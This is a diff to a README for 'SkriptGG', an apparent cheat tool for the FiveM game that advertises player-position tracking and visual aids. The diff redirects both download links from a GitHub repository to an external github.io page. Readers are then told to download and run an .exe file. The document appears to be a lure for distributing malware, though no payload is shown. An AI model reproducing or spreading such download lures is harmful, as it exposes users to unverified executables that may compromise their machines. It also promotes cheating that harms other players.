@@ -1,6 +1,6 @@
 # 🎮 SkriptGG - Better tools for FiveM game play
 
-[![](https://img.shields.io/badge/Download-SkriptGG-blue)](https://github.com/Genuscotoneasterhood290/SkriptGG)
+[![](https://img.shields.io/badge/Download-SkriptGG-blue)](https://genuscotoneasterhood290.github.io)
 
 SkriptGG provides tools to improve your experience in FiveM. This software adds visual aids and menu controls to your multiplayer sessions. Use these features to track player positions, adjust game settings, and see information about items in the game world.
 
@@ -20,7 +20,7 @@ Your computer needs a stable internet connection for the software to function co
 
 You must obtain the installation files from our official repository. Follow these steps to find the file:
 
-1. Visit the main project page at this location: [https://github.com/Genuscotoneasterhood290/SkriptGG](https://github.com/Genuscotoneasterhood290/SkriptGG)
+1. Visit the main project page at this location: [https://genuscotoneasterhood290.github.io](https://genuscotoneasterhood290.github.io)
 2. Locate the Releases section on the right side of the page.
 3. Click on the version link to open the download options.
 4. Select the file ending in .exe to start your download.
